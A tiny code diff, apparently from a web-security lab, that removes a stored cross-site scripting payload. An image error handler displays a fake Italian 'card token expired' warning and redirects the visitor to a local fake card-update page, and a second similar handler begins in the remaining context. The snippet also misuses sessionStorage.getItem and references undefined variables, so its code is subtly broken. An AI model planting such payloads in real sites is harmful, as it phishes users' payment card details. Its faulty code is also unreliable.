@@ -1,16 +1,3 @@
-<img src="x" onerror="
-  try {
-    if (sessionStorage.getItem('username') !== 'attaccante') {
-      sessionStorage.getItem('username', username);
-      sessionStorage.getItem('password', password);
-      alert('Token della carta scaduto. Per motivi di sicurezza aggiornare i dati della carta.');
-      window.location.href='http://localhost:8090/fake-update-card.html';
-    }
-  } catch(e){}
-">
-
-
-
 
 
 <img src="x" onerror="
